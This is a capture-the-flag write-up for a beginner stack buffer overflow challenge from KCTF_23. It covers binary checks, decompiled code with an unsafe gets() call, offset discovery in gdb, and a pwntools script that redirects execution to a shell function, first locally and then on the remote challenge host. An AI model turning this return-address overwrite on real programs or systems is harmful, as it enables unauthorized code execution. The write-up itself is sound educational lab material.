### Binary Exploitation

### Source: KCTF_23

### Overview: This is a basic ROP challenge that gives us the opportunity of overwriting the return address to call the shell function

### Basic File Checks

```
┌──(venv)─(mark㉿haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ file chall 
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f5fbb7f2a0c5c9b20aa961710f86066412543503, for GNU/Linux 3.2.0, not stripped
                                                                                                                                                                                                                  
┌──(venv)─(mark㉿haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ checksec chall    
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

With this we know that we're dealing with a x64 binary.

It is not stripped meaning we will see the function names

Its protection is only `NX` enabled so with that we won't be able to inject shellcode on the stack and get it executed

Now I'l run it to know what it does

```
┌──(venv)─(mark㉿haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ ./chall    
Pop Shell Buddy
Hey wait who are you: pwner
You Lose
```

It prints out `who are you` then it receives our input and prints `You Lose`

I'll decompile it using ghidra to check the functions

Here's the decompiled main function

```
undefined8 main(void)

{
  puts("Pop Shell Buddy");
  hax();
  puts("You Lose");
  return 0;
}
```

Nothing really much here but here's what it does

```
1. It prints pop shell buddy
2. Calls the hax() function
3. Prints you lose
4. Exits
```

Lets take a look at the hax() function


```
void hax(void)

{
  char input [48];
  
  printf("Hey wait who are you: ");
  gets(input);
  return;
}
```

Cool now this is where the vulnerability is 

Here's what it does

```
1. It prints who are you
2. Receives our input using get
3. Exits
```

So we can see that it makes a call to the gets function with the char buffer input as an argument. 

This is a bug. The thing about the gets function, is that there is no size restriction on the amount of data it will scan in.

It will just scan in data until it gets either a newline character or EOF (or something causes it to crash). 

Because if this we can write more data to input than it can hold (which it can hold 32 bytes worth of data) and we will overflow it. 

The data that we overflow will start overwriting subsequent things in memory. 

Looking at this function we don't see any other variables that we can overwrite. 

However we can definitely overwrite the saved return address.

So there's another function which is interesting 

```

void shell(void)

{
  execve("/bin/sh",(char **)0x0,(char **)0x0);
  return;
}
```

We see this basically will grant us shell 

Now here's what i'm going to do 

```
1. Get the offset (the amount of bytes needed to reach the rip)
2. Overwrite the return address to call the shell function
3. Craft the exploit
```

Now lets hop on to gdb to get the offset

I'll set a breakpoint immediately after the call to get and run it giving `1234567890` as input

```
┌──(venv)─(mark㉿haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ gdb -q chall         
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.11
Reading symbols from chall...
(No debugging symbols found in chall)
gef➤  disass hax
Dump of assembler code for function hax:
   0x0000000000401221 <+0>:     endbr64 
   0x0000000000401225 <+4>:     push   rbp
   0x0000000000401226 <+5>:     mov    rbp,rsp
   0x0000000000401229 <+8>:     sub    rsp,0x30
   0x000000000040122d <+12>:    lea    rax,[rip+0xdd8]        # 0x40200c
   0x0000000000401234 <+19>:    mov    rdi,rax
   0x0000000000401237 <+22>:    mov    eax,0x0
   0x000000000040123c <+27>:    call   0x401090 <printf@plt>
   0x0000000000401241 <+32>:    lea    rax,[rbp-0x30]
   0x0000000000401245 <+36>:    mov    rdi,rax
   0x0000000000401248 <+39>:    mov    eax,0x0
   0x000000000040124d <+44>:    call   0x4010b0 <gets@plt>
   0x0000000000401252 <+49>:    nop
   0x0000000000401253 <+50>:    leave  
   0x0000000000401254 <+51>:    ret    
End of assembler dump.
gef➤  b *0x0000000000401253
Breakpoint 1 at 0x401253
gef➤  r
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/chall 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Pop Shell Buddy
Hey wait who are you: 1234567890

Breakpoint 1, 0x0000000000401253 in hax ()

















[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffdde0  →  "1234567890"
$rbx   : 0x007fffffffdf38  →  0x007fffffffe29c  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/c[...]"
$rcx   : 0x007ffff7f9ba80  →  0x00000000fbad208b
$rdx   : 0x1               
$rsp   : 0x007fffffffdde0  →  "1234567890"
$rbp   : 0x007fffffffde10  →  0x007fffffffde20  →  0x0000000000000001
$rsi   : 0x1               
$rdi   : 0x007ffff7f9da20  →  0x0000000000000000
$rip   : 0x00000000401253  →  <hax+50> leave 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x007ffff7dd62a8  →  0x00100022000043f9
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf48  →  0x007fffffffe2d3  →  "COLORFGBG=15;0"
$r14   : 0x00000000403e18  →  0x00000000401180  →  <__do_global_dtors_aux+0> endbr64 
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdde0│+0x0000: "1234567890"   ← $rax, $rsp
0x007fffffffdde8│+0x0008: 0x00000000003039 ("90"?)
0x007fffffffddf0│+0x0010: 0x007fffffffdf38  →  0x007fffffffe29c  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/c[...]"
0x007fffffffddf8│+0x0018: 0x007fffffffde20  →  0x0000000000000001
0x007fffffffde00│+0x0020: 0x0000000000000000
0x007fffffffde08│+0x0028: 0x007fffffffdf48  →  0x007fffffffe2d3  →  "COLORFGBG=15;0"
0x007fffffffde10│+0x0030: 0x007fffffffde20  →  0x0000000000000001        ← $rbp
0x007fffffffde18│+0x0038: 0x00000000401276  →  <main+33> lea rax, [rip+0xdb6]        # 0x402033
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401248 <hax+39>         mov    eax, 0x0
     0x40124d <hax+44>         call   0x4010b0 <gets@plt>
     0x401252 <hax+49>         nop    
 →   0x401253 <hax+50>         leave  
     0x401254 <hax+51>         ret    
     0x401255 <main+0>         endbr64 
     0x401259 <main+4>         push   rbp
     0x40125a <main+5>         mov    rbp, rsp
     0x40125d <main+8>         lea    rax, [rip+0xdbf]        # 0x402023
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x401253 in hax (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401253 → hax()
[#1] 0x401276 → main()
```

Now that we have done that 

I'll search for our input on the stack and the address of rip

```
gef➤  search-pattern 1234567890
[+] Searching '1234567890' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdde0 - 0x7fffffffddea  →   "1234567890" 
gef➤  i f
Stack level 0, frame at 0x7fffffffde20:
 rip = 0x401253 in hax; saved rip = 0x401276
 called by frame at 0x7fffffffde30
 Arglist at 0x7fffffffde10, args: 
 Locals at 0x7fffffffde10, Previous frame's sp is 0x7fffffffde20
 Saved registers:
  rbp at 0x7fffffffde10, rip at 0x7fffffffde18
gef➤  
```

Now we have that our input is stored `0x7fffffffdde0` and the rip at that point is `0x7fffffffde18`

So i'll do the calculation to get the offset

```
└─$ python3             
Python 3.10.8 (main, Oct 24 2022, 10:07:16) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0x7fffffffde18-0x7fffffffdde0)
'0x38'
>>>
```

Cool the offset is `0x38` 

Also we can get the offset using cyclic 

```
└─$ cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

I'll run the binary in gdb and us the input as the value cyclic generated

```
└─$ gdb -q chall
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from chall...
(No debugging symbols found in chall)
gef➤  r 
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/chall 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Pop Shell Buddy
Hey wait who are you: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401254 in hax ()


[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffdde0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$rbx   : 0x007fffffffdf38  →  0x007fffffffe29c  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/c[...]"
$rcx   : 0x007ffff7f9ba80  →  0x00000000fbad208b
$rdx   : 0x1               
$rsp   : 0x007fffffffde18  →  "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
$rbp   : 0x6161616e6161616d ("maaanaaa"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7f9da20  →  0x0000000000000000
$rip   : 0x00000000401254  →  <hax+51> ret 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x007ffff7dd62a8  →  0x00100022000043f9
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf48  →  0x007fffffffe2d3  →  "COLORFGBG=15;0"
$r14   : 0x00000000403e18  →  0x00000000401180  →  <__do_global_dtors_aux+0> endbr64 
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffde18│+0x0000: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"         ← $rsp
0x007fffffffde20│+0x0008: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x007fffffffde28│+0x0010: "saaataaauaaavaaawaaaxaaayaaa"
0x007fffffffde30│+0x0018: "uaaavaaawaaaxaaayaaa"
0x007fffffffde38│+0x0020: "waaaxaaayaaa"
0x007fffffffde40│+0x0028: 0x00000061616179 ("yaaa"?)
0x007fffffffde48│+0x0030: 0x007fffffffdf38  →  0x007fffffffe29c  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/c[...]"
0x007fffffffde50│+0x0038: 0x007fffffffdf38  →  0x007fffffffe29c  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/c[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40124d <hax+44>         call   0x4010b0 <gets@plt>
     0x401252 <hax+49>         nop    
     0x401253 <hax+50>         leave  
 →   0x401254 <hax+51>         ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x401254 in hax (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401254 → hax()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  q
```

With this i'll use the first four byte in the `rsp` register and search it using cyclic to get the offset 

```
┌──(venv)─(mark㉿haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
└─$ cyclic -l oaaa
56
```

We see its the same thing `0x38 = 56`

Now lets craft the exploit using pwntools

But before that we need the memory address we want to return to which is of cause the the shell function

I'll use gdb to get it

```
└─$ gdb -q chall
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.11
Reading symbols from chall...
(No debugging symbols found in chall)
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401080  puts@plt
0x0000000000401090  printf@plt
0x00000000004010a0  execve@plt
0x00000000004010b0  gets@plt
0x00000000004010c0  setvbuf@plt
0x00000000004010d0  _start
0x0000000000401100  _dl_relocate_static_pie
0x0000000000401110  deregister_tm_clones
0x0000000000401140  register_tm_clones
0x0000000000401180  __do_global_dtors_aux
0x00000000004011b0  frame_dummy
0x00000000004011b6  setup
0x00000000004011fd  shell
0x0000000000401221  hax
0x0000000000401255  main
0x000000000040128c  _fini
gef➤ 
```

Now we have it as `0x00000000004011fd`

Lets get on with the exploit

Here's the script below

```
#Imports all pwntool library
from pwn import *

#Starts the binary 
io = process('./chall')
#io = remote('13.127.20.4', 1234)

#Creates the offset and the address we want to return to 
offset = b"A"*56
add = p64(0x00000000004011fd)
payload = offset + add

#Send the payload
io.send(payload)
io.send('\n')

#Gives an interactive shell
io.interactive()
```

Now I'll run it 

```
└─$ python2 exploit.py 
[+] Starting local process './chall': pid 11701
[*] Switching to interactive mode
Pop Shell Buddy
Hey wait who are you: $ 
$ id
uid=1000(mark) gid=1000(mark) groups=1000(mark),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),121(bluetooth),137(scanner),142(kaboxer)
$ 
$ whoami
mark
$ ls
boi  chall  exploit.py    getit  justdoit  pwn1  santa  secret  vulnchat    warmup
$ 
```

It worked cool

So i'll run it on the remote target now

Here's the script

```
#Imports all pwntool library
from pwn import *

#Starts the binary 
#io = process('./chall')
io = remote('13.127.20.4', 1234)

#Creates the offset and the address we want to return to 
offset = b"A"*56
add = p64(0x00000000004011fd)
payload = offset + add

#Send the payload
io.send(payload)
io.send('\n')

#Gives an interactive shell
io.interactive()
```

On running it 

```
└─$ python2 exploit.py
[+] Opening connection to 13.127.20.4 on port 1234: Done
[*] Switching to interactive mode
Pop Shell Buddy
Hey wait who are you: $ 
$ ls -al
total 28
drwxr-x--- 1 root pwnuser  4096 Jan 29 16:19 .
drwxr-xr-x 1 root root     4096 Jan 29 16:20 ..
-rwxr-x--- 1 root pwnuser 16264 Jan 29 15:18 chall
-rwxr-x--- 1 root pwnuser    21 Jan 29 15:19 flag.txt
$ cat flag.txt
KYC{R0P_g0t_ch@1neD}
$
```

We get the flag 


And we're done

<br> <br>
[Back To Home](../../index.md)
